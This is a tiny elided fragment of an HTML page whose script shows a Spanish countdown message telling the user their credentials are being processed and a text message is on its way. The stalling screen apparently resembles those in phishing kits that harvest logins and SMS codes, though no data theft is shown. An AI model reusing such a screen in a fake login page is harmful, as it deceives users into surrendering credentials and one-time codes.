...
<link href="assets/estilito.css" rel="stylesheet">
    ...
    {
        document.getElementById('contador').innerHTML = "Estamos procesando sus credenciales. <br> Por favor, espera "+tiempo+" segundos, <br> te estamos enviando un mensaje de texto.";
